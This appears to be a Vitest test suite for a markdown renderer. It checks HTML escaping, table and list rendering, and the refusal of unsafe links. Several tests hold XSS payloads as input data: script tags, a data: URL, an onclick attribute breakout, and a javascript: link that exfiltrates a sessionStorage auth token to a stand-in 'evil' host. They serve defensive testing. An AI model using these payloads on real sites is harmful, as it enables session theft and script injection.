// Markdown renderer smoke tests (legacy renderMarkdown parity): the
// escape-first contract is the security-critical part.
import { describe, expect, it } from "vitest";
import { renderMarkdown } from "../markdown";

describe("renderMarkdown", () => {
  it("escapes HTML before introducing markup", () => {
    const html = renderMarkdown("<script>alert('x')</script>");
    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("escapes quotes so attribute contexts cannot be broken out of", () => {
    const html = renderMarkdown('say "hi" it\'s fine');
    expect(html).not.toContain('"hi"');
    expect(html).toContain("&quot;hi&quot;");
    expect(html).toContain("&#39;");
  });

  it("renders bold and inline code", () => {
    const html = renderMarkdown("**bold** and `code`");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<code>code</code>");
  });

  it("renders fenced code blocks", () => {
    const html = renderMarkdown("```bash\nkubectl get pods\n```");
    expect(html).toContain('<pre><code class="lang-bash">kubectl get pods</code></pre>');
  });

  it("adds rel=noreferrer to links", () => {
    const html = renderMarkdown("[docs](https://example.com)");
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('href="https://example.com"');
  });

  it("refuses javascript: links (rendered as plain text)", () => {
    // Walkthrough-review finding: a javascript: URL with no parentheses
    // passes the link capture and could exfiltrate sessionStorage tokens.
    const html = renderMarkdown(
      "[run](javascript:location='https://evil/?t='+sessionStorage['luban.portal.authSession'])",
    );
    expect(html).not.toContain("href=");
    expect(html).toContain("run");
  });

  it("refuses data: links (rendered as plain text)", () => {
    const html = renderMarkdown("[x](data:text/html,<script>alert(1)</script>)");
    expect(html).not.toContain("href=");
  });

  it("neutralizes quote-based attribute breakout inside link targets", () => {
    const html = renderMarkdown('[x](https://a" onclick="alert(1))');
    expect(html).not.toContain(' onclick="alert(1)');
    // The double quote lands inside the attribute as &quot;.
    expect(html).toContain("https://a&quot;");
  });

  it("renders a GFM table as one table with a thead header row", () => {
    // Walkthrough finding: the line-by-line port dropped the separator but
    // left a blank line, splitting header and body into two stacked tables
    // that rendered disconnected. One block must yield one <table>.
    const html = renderMarkdown(
      "| POD | STATUS |\n| --- | --- |\n| web-ui | Running |",
    );
    expect(html.match(/<table>/g)?.length).toBe(1);
    expect(html).toContain("<thead><tr><th>POD</th><th>STATUS</th></tr></thead>");
    expect(html).toContain("<tbody><tr><td>web-ui</td><td>Running</td></tr></tbody>");
    expect(html).not.toContain("---");
  });

  it("supports alignment markers in table separators", () => {
    const html = renderMarkdown("| a | b |\n|:---|---:|\n| 1 | 2 |");
    expect(html.match(/<table>/g)?.length).toBe(1);
    expect(html).toContain("<th>a</th>");
    expect(html).toContain("<td>1</td>");
  });

  it("renders flat unordered bullets as one list", () => {
    const html = renderMarkdown("- one\n- two");
    expect(html).toBe("<ul><li>one</li><li>two</li></ul>");
  });

  it("nests indented sub-bullets instead of dropping them to plain text", () => {
    // v0.18.1 live-check finding: indented bullets rendered as literal
    // "- text" paragraphs at the left edge, without bullets or indent.
    const html = renderMarkdown(
      "- Next steps:\n  - Verify the new pod settles into a stable Running state\n  - Investigate the root cause of the restarts",
    );
    expect(html).toBe(
      "<ul><li>Next steps:<ul>" +
        "<li>Verify the new pod settles into a stable Running state</li>" +
        "<li>Investigate the root cause of the restarts</li>" +
        "</ul></li></ul>",
    );
  });

  it("renders indented bullets without a parent item as a top-level list", () => {
    const html = renderMarkdown(
      "You can either:\n  - Restart the pod\n  - Pull the old pod logs",
    );
    expect(html).toContain("<ul><li>Restart the pod</li><li>Pull the old pod logs</li></ul>");
    expect(html).toContain("<p>You can either:</p>");
    expect(html).not.toContain("- Restart");
  });

  it("wraps ordered items in <ol> so numbering renders", () => {
    const html = renderMarkdown("1. First step\n2. Second step");
    expect(html).toBe("<ol><li>First step</li><li>Second step</li></ol>");
  });

  it("nests an unordered list under an ordered item", () => {
    const html = renderMarkdown("1. Triage\n   - Check the pod status\n2. Report");
    expect(html).toBe(
      "<ol><li>Triage<ul><li>Check the pod status</li></ul></li><li>Report</li></ol>",
    );
  });

  it("keeps list content escaped (no markup injection via items)", () => {
    const html = renderMarkdown("- <script>alert(1)</script>");
    expect(html).toContain("<li>&lt;script&gt;alert(1)&lt;/script&gt;</li>");
  });

  it("returns empty string for empty input", () => {
    expect(renderMarkdown("")).toBe("");
  });
});
